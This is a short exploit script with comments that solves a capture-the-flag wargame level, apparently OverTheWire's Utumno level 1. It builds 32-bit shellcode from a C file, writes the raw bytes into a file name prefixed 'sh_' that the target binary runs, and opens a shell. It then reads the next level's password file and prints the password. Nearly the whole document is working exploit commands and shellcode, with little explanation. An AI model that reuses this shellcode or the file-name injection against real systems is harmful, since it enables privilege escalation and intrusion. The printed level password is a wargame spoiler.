# According to ghidra, utumno1 will find the file under argv[1] starting with "sh_"
# And run the filename without "sh_" 
# So we need to create a file named "sh_{shellcode}" let it run

# Use shellcode.c to generate the shellcode
gcc -m32 shellcode.c -o shellcode.o
# Get the shellcode hex
cat shellcode.o | xxd -p | tr -d '\n' | sed 's/.*\(6a31.*cd80.*cd80\).*/\1/' > shellcode.hex
cat shellcode.hex
# 6a315899cd8089c389c16a4658cd80b00b52ba91d08c9783f2ff52bad0d09d9683f2ff5231d289e389d1cd80
# Now change this hex to bytes
# b'j1X\x99\xcd\x80\x89\xc3\x89\xc1jFX\xcd\x80\xb0\x0bR\xba\x91\xd0\x8c\x97\x83\xf2\xffR\xba\xd0\xd0\x9d\x96\x83\xf2\xffR1\xd2\x89\xe3\x89\xd1\xcd\x80'

# Create the file
./run.sh
mkdir /tmp/ballban_utumno1
cd /tmp/ballban_utumno1
touch sh_$(printf "j1X\x99\xcd\x80\x89\xc3\x89\xc1jFX\xcd\x80\xb0\x0bR\xba\x91\xd0\x8c\x97\x83\xf2\xffR\xba\xd0\xd0\x9d\x96\x83\xf2\xffR1\xd2\x89\xe3\x89\xd1\xcd\x80")
/utumno/utumno1 /tmp/ballban_utumno1 ./

# Now we have the shell
bash -l
cat /etc/utumno_pass/utumno2
# Password: RdUzprHKSm